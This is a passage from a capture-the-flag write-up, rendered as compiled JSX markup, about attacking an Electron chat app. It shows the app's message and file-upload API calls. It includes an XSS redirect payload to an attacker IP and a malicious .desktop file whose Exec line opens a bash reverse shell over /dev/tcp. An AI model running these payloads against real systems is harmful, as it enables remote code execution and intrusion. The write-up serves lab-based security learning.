08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":6,\"sender\":\"admin\",\"receiver\":\"developer\",\"message\":\"Yes I know you did explained me why I should use it only on server.\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":7,\"sender\":\"developer\",\"receiver\":\"admin\",\"message\":\"Nice.\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":8,\"sender\":\"admin\",\"receiver\":\"developer\",\"message\":\"The service checkup script that you created is not working anymore with the selenium grid after the update. We create a temporary workaround for that but can you please come and fix the script?\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":9,\"sender\":\"developer\",\"receiver\":\"admin\",\"message\":\"Yeah Sure\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"true\",\"type\":\"message\"},{\"id\":10,\"sender\":\"tbug\",\"receiver\":\"developer\",\"message\":\"Why userland city market place is not working for me?\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"true\",\"type\":\"message\"}]\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The only interesting message was this:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`The service checkup script that you created is not working anymore with the Selenium grid after the update. We create a temporary workaround for that but can you please come and fix the script?\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"For the time being, this may be irrelevant until we check the other endpoints.\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"fetch\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"_config_json__WEBPACK_IMPORTED_MODULE_1__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"BACKEND_URL\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/api/chats/\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"currentChat\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/add\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"method\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'POST'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"headers\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                  \",(0,e.jsx)(n.span,{className:\"token string-property property\",children:\"'Accept'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'application/json'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                  \",(0,e.jsx)(n.span,{className:\"token string-property property\",children:\"'Content-Type'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'application/json'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                  \",(0,e.jsx)(n.span,{className:\"token string-property property\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token dom variable\",children:\"localStorage\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"getItem\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" \",(0,e.jsx)(n.span,{className:\"token function-variable function\",children:\"uploadFile\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token parameter\",children:\"e\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=>\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" formData \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"new\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name\",children:\"FormData\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            formData\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"append\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'uploadedFile'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" e\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"target\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"files\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token function\",children:\"fetch\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"_config_json__WEBPACK_IMPORTED_MODULE_1__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"BACKEND_URL\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/api/\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"currentChat\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/upload\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"method\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'POST'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"headers\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                \",(0,e.jsx)(n.span,{className:\"token string-property property\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token dom variable\",children:\"localStorage\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"getItem\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"body\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),` formData\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And now we have a way to interact with users by sending them files and messages!\"}),`\n`,(0,e.jsx)(n.p,{children:\"Now, let\\u2019s get back to the message that we got earlier, where the users were talking about a Selenium script. Selenium allows you to write test scripts or bots that interact with a web application in a similar way to how a user would interact with the application. We can assume now that we will have to trick the bot into downloading our files or interacting with our messages!\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"Here\\u2019s an example on how we can use both \",(0,e.jsx)(n.code,{children:\"/add\"}),\" and \",(0,e.jsx)(n.code,{children:\"/upload\"}),\" API to download/add files/messages:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-http\",children:(0,e.jsxs)(n.code,{className:\"language-http code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token request-line\",children:[(0,e.jsx)(n.span,{className:\"token method property\",children:\"POST\"}),\" \",(0,e.jsx)(n.span,{className:\"token request-target url\",children:(0,e.jsxs)(n.span,{className:\"token path\",children:[(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"api\",(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"chats\",(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"admin\",(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"add\"]})}),\" \",(0,e.jsx)(n.span,{className:\"token http-version property\",children:\"HTTP/1.1\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Host\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"10.129.255.120:9000\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Cache-Control\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"max-age=0\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"token\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token header-value\",children:\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA2MjEwMywiZXhwIjoxNjcwMDgzNzAzfQ.G1M-pWAsNnKSFxSoljbBd_lwZVGurgn9_IApQppnGgs\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Upgrade-Insecure-Requests\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"1\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"User-Agent\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Accept\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Accept-Encoding\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"gzip, deflate\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Accept-Language\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"en-US,en;q=0.9\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Connection\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"close\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Type\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"application/json\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Length\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"62\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token application-json\",children:`\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token application-json\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token property\",children:'\"message\"'}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"<script>document.location=\"'}),\"http\",(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token comment\",children:'//10.10.10.10/jaja\"<\\/script>\"}'}),`\n`]})})]})}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`POST /api/admin/upload HTTP/1.1\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Host: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10.129\"}),`.255.120:9000\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"User-Agent: Mozilla/5.0 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"X11\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" Linux x86_64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" AppleWebKit/537.36 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"KHTML, like Gecko\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),` Chrome/107.0.0.0 Safari/537.36\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Accept-Encoding: gzip, deflate\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Accept: text/html,application/xhtml+xml,application/xml\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"q\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.9\"}),\",image/avif,image/webp,image/apng,*/*\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"q\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.8\"}),\",application/signed-exchange\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"v\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"b3\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"q\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.9\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Connection: close\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Cache-Control: max-age\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA2MjEwMywiZXhwIjoxNjcwMDgzNzAzfQ.G1M-pWAsNnKSFxSoljbBd_lwZVGurgn9_IApQppnGgs\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Upgrade-Insecure-Requests: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Accept-Language: en-US,en\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"q\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.9\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Content-Length: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"247\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Content-Type: multipart/form-data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"boundary\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`02427ffc75ddf91f43eb19151c610654\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`--02427ffc75ddf91f43eb19151c610654\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Content-Disposition: form-data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"name\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"uploadedFile\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"filename\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"testfile\"'}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`pwned\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`--02427ffc75ddf91f43eb19151c610654--\n`})]})}),`\n`,(0,e.jsxs)(n.h3,{id:\"bonus-part---running-gui-app\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#bonus-part---running-gui-app\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"BONUS PART - Running GUI app\"]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"This part is not needed to continue exploitation or understand the exploit path.\"}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"So, if we try to open the GUI application. It will keep hanging and that\\u2019s because it wasn\\u2019t able to reach the API as the \",(0,e.jsx)(n.code,{children:\"config.json\"}),\" file which includes the \",(0,e.jsx)(n.code,{children:\"BACKEND_URL\"}),\" variable is missing. Here we have two options:\"]}),`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"Create the \",(0,e.jsx)(n.code,{children:\"config.json\"}),\" file with the proper \",(0,e.jsx)(n.code,{children:\"BACKEND_URL\"}),\", which is the instance ip\"]}),`\n`,(0,e.jsxs)(n.li,{children:[\"The lazy way (Which I used XD) is to change all the \",(0,e.jsx)(n.code,{children:\"_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL\"}),\" to the ip instance.\"]}),`\n`]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/vscode-replace.png\",alt:\"A screenshot of replacing strings with vscode\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Another thing to change is the CSP in the \",(0,e.jsx)(n.code,{children:\"index.html\"}),\". We can either change \",(0,e.jsx)(n.code,{children:\"127.0.0.1\"}),\" to the machine ip or (as you probably already guessed as I am lazy) just remove the whole CSP:\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/html-csp.png\",alt:\"A screenshot that shows the Content Security Policy of the Web page\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Then we can run the app:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:~/htb/medimelecro/resources \\xBB electron extract\n`})})}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/app-gui.png\",alt:\"A screenshot of the Electron App GUI\"})}),`\n`,(0,e.jsx)(n.p,{children:\"We can also see also the previous conversation that we extracted from the web API:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/admin-chat-gui.png\",alt:\"A screenshot of the Admin chat with the developer\"})}),`\n`,(0,e.jsxs)(n.h3,{id:\"exploitation-1\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#exploitation-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Exploitation\"]}),`\n`,(0,e.jsx)(n.p,{children:\"To wrap everything we found until now:\"}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsx)(n.li,{children:\"Usage of shell.openExternal(url) which can lead to XSS -> RCE\"}),`\n`,(0,e.jsx)(n.li,{children:\"We can send messages to the admin user\"}),`\n`,(0,e.jsx)(n.li,{children:\"We can upload messages to the admin user\"}),`\n`,(0,e.jsx)(n.li,{children:\"Messages mentioning the usage of Selenium scripts\"}),`\n`]}),`\n`,(0,e.jsx)(n.p,{children:\"The only exploitation path we can see is we assume that there is a bot that\\u2019s either downloading the files or clicking the urls (or maybe both?).\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"To achieve RCE, we will trick the bot into opening our malicious \",(0,e.jsx)(n.code,{children:\".desktop\"}),\" file which will contain our reverse shell:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-ini\",children:(0,e.jsxs)(n.code,{className:\"language-ini code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token section\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token section-name selector\",children:\"Desktop Entry\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token key attr-name\",children:\"Exec\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token value attr-value\",children:'bash -c \"bash -i >& /dev/tcp/10.10.14.57/443 0>&1\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token key attr-name\",children:\"Type\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token value attr-value\",children:\"Application\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will trick the user to open our link, which will be passed to \",(0,e.jsx)(n.code,{children:\"shell.openExternal\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-html\",children:(0,e.jsx)(n.code,{className:\"language-html code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"<\"}),\"a\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"className\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"an\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"open\"}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"href\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"LINK\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),\"test\",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token 